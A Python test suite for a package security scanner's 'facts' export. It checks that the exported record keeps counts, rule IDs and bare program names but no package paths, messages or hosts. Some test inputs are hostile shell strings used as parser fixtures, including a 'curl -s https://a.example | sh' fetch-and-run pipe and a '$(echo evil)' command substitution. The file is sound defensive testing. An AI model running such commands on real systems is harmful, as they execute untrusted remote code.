"""The facts export (`facts/v1`, learning loop row LL-1): facts and counts about a package, and no text from it."""

from __future__ import annotations

import json

from cordon_scanner import Scanner
from cordon_scanner.engine.registry import Registry
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Hook, Location
from cordon_scanner.foundation.results import Dependency, Repository, ScanResult
from cordon_scanner.report.base import ReportOptions
from cordon_scanner.report.facts import FACTS_VERSION, ScanFacts
from support import BENIGN, Support, requires_corpus

#: Text the package wrote, which must never reach the record: its paths and file names, a message, a host.
PACKAGE_TEXT = (
    "lib/helper-spawn.js",
    "helper-spawn",
    "dist/index.js",
    "install.js",
    "telemetry.example",
)


class FactsKit:
    @staticmethod
    def result(**overrides: object) -> ScanResult:
        findings = (
            Support.a_finding(
                rule_id="CAP.JS.SPAWN.001",
                location=Location(path="lib/helper-spawn.js", line=3),
                capabilities=(Capability.SPAWN,),
                message="spawns a process at telemetry.example",
            ),
            Support.a_finding(
                rule_id="CAP.JS.EGRESS.001",
                location=Location(path="lib/helper-spawn.js", line=9),
                capabilities=(Capability.EGRESS,),
            ),
            Support.a_finding(
                rule_id="CAP.JS.EGRESS.001",
                location=Location(path="dist/index.js", line=1),
                capabilities=(Capability.EGRESS,),
            ),
            Support.a_finding(
                rule_id="POLICY.PACKAGE.EXAMPLE.001", location=Location(path=".", line=None)
            ),
        )
        fields: dict[str, object] = {
            "findings": findings,
            "repository": Repository(
                root="/tmp/pkg",
                hooks=(
                    Hook(
                        kind="postinstall",
                        path="package.json",
                        name="postinstall",
                        command="node ./install.js --quiet && /usr/bin/env echo done",
                    ),
                ),
                file_count=4,
            ),
            "dependencies": (
                Dependency(
                    purl="pkg:npm/left-pad@1.3.0",
                    ecosystem="npm",
                    name="left-pad",
                    version="1.3.0",
                    direct=True,
                ),
            ),
            "places": {"install_entry": ("install.js",), "import_entry": ("dist/index.js",)},
            "target_kind": "package",
            "engine_version": "0.8.0",
        }
        fields.update(overrides)
        return ScanResult(**fields)  # type: ignore[arg-type]


class TestTheRecordHoldsFactsAndNoText:
    def test_no_path_name_message_or_host_of_the_package_reaches_the_record(self) -> None:
        text = json.dumps(ScanFacts.of(FactsKit.result()))
        for written in PACKAGE_TEXT:
            assert written not in text, written

    def test_a_capability_file_no_place_reaches_is_counted_as_unreached(self) -> None:
        record = ScanFacts.of(FactsKit.result())
        spawn = next(
            f for f in record["files"] if f["key"] == ScanFacts.file_key("lib/helper-spawn.js")
        )
        assert spawn["reached"] is False and spawn["places"] == []
        assert spawn["capabilities"] == sorted([str(Capability.SPAWN), str(Capability.EGRESS)])
        assert spawn["rules"] == {"CAP.JS.EGRESS.001": 1, "CAP.JS.SPAWN.001": 1}
        assert record["package"]["unreached_capability_files"] == 1

    def test_a_file_in_a_place_carries_the_place_and_is_reached(self) -> None:
        record = ScanFacts.of(FactsKit.result())
        entry = next(f for f in record["files"] if f["key"] == ScanFacts.file_key("dist/index.js"))
        assert (
            entry["places"] == ["import_entry"]
            and entry["reached"] is True
            and entry["ext"] == "js"
        )
        hook = next(f for f in record["files"] if f["key"] == ScanFacts.file_key("install.js"))
        assert hook["places"] == ["install_entry"] and hook["rules"] == {}

    def test_package_level_facts(self) -> None:
        package = ScanFacts.of(FactsKit.result())["package"]
        assert package["places"] == {"import_entry": 1, "install_entry": 1}
        assert package["hooks"] == [{"kind": "postinstall", "programs": ["node", "env"]}]
        assert package["dependencies"] == {"total": 1, "direct": 1, "local": 0}
        assert package["rules"] == {"POLICY.PACKAGE.EXAMPLE.001": 1}

    def test_a_suppressed_finding_is_not_a_fact(self) -> None:
        from cordon_scanner.foundation.models import Suppression

        hidden = Support.a_finding(
            rule_id="CAP.JS.EGRESS.001",
            location=Location(path="lib/other.js", line=1),
            suppressed=Suppression(
                rule="CAP.JS.EGRESS.001",
                path="lib/other.js",
                justification="example",
                expires="2099-01-01",
            ),
        )
        record = ScanFacts.of(FactsKit.result(findings=(hidden,)))
        assert ScanFacts.file_key("lib/other.js") not in {f["key"] for f in record["files"]}


class TestTheRecordIsCanonical:
    def test_two_builds_give_the_same_bytes_and_the_digest_is_of_the_canonical_form(self) -> None:
        a = (
            Registry()
            .reporter("facts")
            .render_to_string(FactsKit.result(), ReportOptions(color=False))
        )
        b = (
            Registry()
            .reporter("facts")
            .render_to_string(FactsKit.result(), ReportOptions(color=False))
        )
        assert a == b and a.endswith("\n") and a.count("\n") == 1
        record = json.loads(a)
        assert record["facts_version"] == FACTS_VERSION
        import hashlib

        assert record["digest"] == hashlib.sha256(ScanFacts.canonical(record)).hexdigest()

    def test_the_order_of_findings_does_not_change_the_record(self) -> None:
        result = FactsKit.result()
        reversed_result = FactsKit.result(findings=tuple(reversed(result.findings)))
        assert ScanFacts.of(result) == ScanFacts.of(reversed_result)


class TestOnlyTheScannersVocabularyIsCopied:
    def test_hook_programs_are_bare_names_without_paths_or_arguments(self) -> None:
        assert ScanFacts.programs("FOO=1 ./scripts/run.sh --x; curl -s https://a.example | sh") == [
            "run.sh",
            "curl",
            "sh",
        ]
        assert ScanFacts.programs("node -e \"require('x')\"") == ["node"]

    def test_a_program_word_that_is_not_a_plain_name_is_left_out(self) -> None:
        assert ScanFacts.programs("$(echo evil) && `x`") == []

    def test_a_rule_id_outside_the_scanners_form_is_counted_as_other(self) -> None:
        assert ScanFacts.rule_id("CAP.JS.SPAWN.001") == "CAP.JS.SPAWN.001"
        assert ScanFacts.rule_id("pack rule: steal /home/user") == "OTHER"

    def test_the_extension_is_short_and_plain_or_empty(self) -> None:
        assert ScanFacts.extension("a/b/c.PY") == "py"
        assert ScanFacts.extension("a.tgz!pkg/x.mjs") == "mjs"
        assert ScanFacts.extension("a/.bashrc") == ""
        assert ScanFacts.extension("a/b.verylongextension") == ""


@requires_corpus
class TestARealScanRecordsWhereFilesRun:
    """The place sets come from the engine's own scan context, not from a hand-built result."""

    def test_an_install_script_is_an_install_place(self) -> None:
        result = Scanner(Config.default()).scan(BENIGN / "setup-helper")
        assert result.places is not None
        assert "setup.py" in result.places.get("install_hook", ())
        record = ScanFacts.of(result)
        setup = next(f for f in record["files"] if f["key"] == ScanFacts.file_key("setup.py"))
        assert "install_hook" in setup["places"] and setup["reached"] is True

    def test_a_lifecycle_hook_gives_its_program_name_only(self) -> None:
        record = ScanFacts.of(Scanner(Config.default()).scan(BENIGN / "npm-native-build"))
        assert {"kind": "install", "programs": ["node-gyp"]} in record["package"]["hooks"]
        assert "rebuild" not in json.dumps(record)
